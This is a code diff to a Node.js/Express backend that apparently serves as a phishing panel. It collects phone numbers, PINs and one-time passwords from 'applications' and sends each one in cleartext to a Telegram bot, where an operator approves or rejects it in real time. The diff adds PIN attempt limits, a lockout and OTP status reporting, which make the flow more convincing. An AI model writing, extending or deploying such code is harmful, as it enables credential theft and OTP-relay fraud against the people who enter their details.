@@ -12,7 +12,7 @@ app.use(express.json());
 const frontendPath = path.join(__dirname, '../frontend');
 app.use(express.static(frontendPath));
 
-// Explicitly serve style.css with correct MIME type
+// Explicitly serve style.css
 app.get('/style.css', (req, res) => {
   res.sendFile(path.join(frontendPath, 'style.css'), {
     headers: { 'Content-Type': 'text/css' }
@@ -27,7 +27,6 @@ const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 // In-memory store
 const applications = {};
-const approvalStates = {};
 
 // Telegram helper
 async function sendTelegramMessage(message, buttons = null) {
@@ -45,19 +44,23 @@ async function sendTelegramMessage(message, buttons = null) {
   }
 }
 
-// API routes
+// ─── API Routes ───
 
 // Health check
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
-// Send application
+// Submit application
 app.post('/api/send-application', async (req, res) => {
   const data = req.body.applicationData;
   const appId = `${data.phone}_${Date.now()}`;
+
   applications[appId] = {
     ...data,
     pinStatus: 'pending',
     otpStatus: 'pending',
+    pinAttempts: 0,
+    maxPinAttempts: 3,
+    pinBlockedUntil: null,
     createdAt: new Date().toISOString()
   };
 
@@ -74,9 +77,21 @@ app.post('/api/send-application', async (req, res) => {
 // Send PIN
 app.post('/api/send-pin', async (req, res) => {
   const { applicationId, pin } = req.body;
-  if (!applications[applicationId]) return res.status(404).json({ ok: false, error: 'Application not found' });
-  applications[applicationId].pin = pin;
-  applications[applicationId].pinStatus = 'pending';
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  // Check block
+  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
+    return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
+  }
+  // Reset if block expired
+  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
+    app.pinAttempts = 0;
+    app.pinBlockedUntil = null;
+  }
+
+  app.pin = pin;
+  app.pinStatus = 'pending';
 
   const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Approve or reject:*`;
   const buttons = [[
@@ -85,15 +100,17 @@ app.post('/api/send-pin', async (req, res) => {
   ]];
 
   await sendTelegramMessage(message, buttons);
-  res.json({ ok: true, status: 'waiting_admin' });
+  res.json({ ok: true, status: 'pending' });
 });
 
 // Send OTP
 app.post('/api/send-otp', async (req, res) => {
   const { applicationId, otp } = req.body;
-  if (!applications[applicationId]) return res.status(404).json({ ok: false, error: 'Application not found' });
-  applications[applicationId].otp = otp;
-  applications[applicationId].otpStatus = 'pending';
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  app.otp = otp;
+  app.otpStatus = 'pending';
 
   const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Approve or reject:*`;
   const buttons = [[
@@ -102,15 +119,16 @@ app.post('/api/send-otp', async (req, res) => {
   ]];
 
   await sendTelegramMessage(message, buttons);
-  res.json({ ok: true, status: 'waiting_admin' });
+  res.json({ ok: true, status: 'pending' });
 });
 
 // Resend OTP
 app.post('/api/resend-otp', async (req, res) => {
   const { applicationId } = req.body;
-  if (!applications[applicationId]) return res.status(404).json({ ok: false, error: 'Application not found' });
-  applications[applicationId].otpStatus = 'pending';
+  const app = applications[applicationId];
+  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
+  app.otpStatus = 'pending';
   const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📌 New OTP requested.\n✅ *Approve or reject:*`;
   const buttons = [[
     { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
@@ -125,13 +143,23 @@ app.post('/api/resend-otp', async (req, res) => {
 app.get('/api/status/:applicationId/:step', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
   let status = 'pending';
-  if (req.params.step === 'pin') status = app.pinStatus;
-  else if (req.params.step === 'otp') status = app.otpStatus;
-  res.json({ ok: true, status });
+  let remainingAttempts = null;
+  let blocked = false;
+
+  if (req.params.step === 'pin') {
+    status = app.pinStatus;
+    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
+    blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
+  } else if (req.params.step === 'otp') {
+    status = app.otpStatus;
+  }
+
+  res.json({ ok: true, status, remainingAttempts, blocked });
 });
 
-// Telegram Webhook
+// ─── Telegram Webhook ───
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
 
@@ -141,8 +169,25 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const app = applications[applicationId];
     if (!app) return res.sendStatus(200);
 
-    if (step === 'PIN') app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
-    else if (step === 'OTP') app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
+    if (step === 'PIN') {
+      if (action === 'YES') {
+        app.pinStatus = 'approved';
+      } else {
+        app.pinAttempts = (app.pinAttempts || 0) + 1;
+        if (app.pinAttempts >= app.maxPinAttempts) {
+          app.pinStatus = 'blocked';
+          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
+        } else {
+          app.pinStatus = 'rejected';
+        }
+      }
+    } else if (step === 'OTP') {
+      if (action === 'YES') {
+        app.otpStatus = 'approved';
+      } else {
+        app.otpStatus = 'rejected';
+      }
+    }
 
     await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
       method: 'POST',
@@ -166,7 +211,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         let msg = '📋 Recent applications:\n';
         ids.forEach(id => {
           const app = applications[id];
-          msg += `${id} – ${app.phone} (${app.pinStatus})\n`;
+          msg += `${id} – ${app.phone} (PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
         });
         await sendTelegramMessage(msg || 'No applications yet.');
       } else if (text === '/help') {
